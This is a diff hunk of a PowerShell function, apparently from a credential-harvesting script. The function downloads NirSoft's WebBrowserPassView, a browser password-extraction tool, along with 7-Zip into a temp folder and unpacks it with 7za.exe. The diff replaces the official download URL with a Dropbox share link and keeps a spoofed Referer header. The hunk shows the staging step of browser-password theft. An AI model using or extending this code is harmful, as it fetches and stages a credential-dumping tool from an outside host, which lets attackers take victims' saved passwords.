@@ -3,7 +3,7 @@ function Get-Nirsoft {
 
   mkdir \temp 
   cd \temp
-  Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
+  Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.dropbox.com/scl/fi/u5njcx487e9ocbdikwjuf/webbrowserpassview.zip?rlkey=1bbn5wh71yi6cn9q4wftip2nq&st=rywm1w8o&dl=1 -OutFile wbpv.zip
   Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
   Expand-Archive 7z.zip 
   .\7z\7za.exe e wbpv.zip
